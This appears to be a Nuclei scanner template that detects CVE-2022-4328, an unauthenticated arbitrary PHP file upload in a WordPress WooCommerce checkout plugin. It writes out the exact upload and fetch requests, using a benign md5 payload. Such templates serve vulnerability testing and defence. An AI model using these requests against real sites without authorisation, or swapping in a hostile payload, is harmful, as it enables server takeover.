http:
- matchers:
  - part: body
    type: word
    words:
    - fe5df26ce4ca0056ffae8854469c282f
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=cfom_upload_file&name={{randstr}}.pHp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=------------------------22728be7b3104597


    --------------------------22728be7b3104597

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

    Content-Type: application/octet-stream


    <?php echo md5("CVE-2022-4328"); ?>


    --------------------------22728be7b3104597--

    '
  - 'GET /wp-content/uploads/cfom_files/{{to_lower(''{{randstr}}'')}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-4328
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:najeebmedia:woocommerce_checkout_field_manager:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-4328
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.96077
    epss-score: 0.22681
  description: 'The WooCommerce Checkout Field Manager WordPress plugin before 18.0
    does not validate files to be uploaded, which could allow unauthenticated attackers
    to upload arbitrary files such as PHP on the server.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: woocommerce_checkout_field_manager
    vendor: najeebmedia
    verified: true
  name: WooCommerce Checkout Field Manager < 18.0 - Arbitrary File Upload
  reference:
  - https://wpscan.com/vulnerability/4dc72cd2-81d7-4a66-86bd-c9cfaf690eed
  - https://wordpress.org/plugins/n-media-woocommerce-checkout-fields/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4328
  remediation: Fixed in version 18.0
  severity: critical
  tags: wp,n-media-woocommerce-checkout-fields,wpscan,cve,cve2022,rce,wordpress,wp-plugin,intrusive,najeebmedia
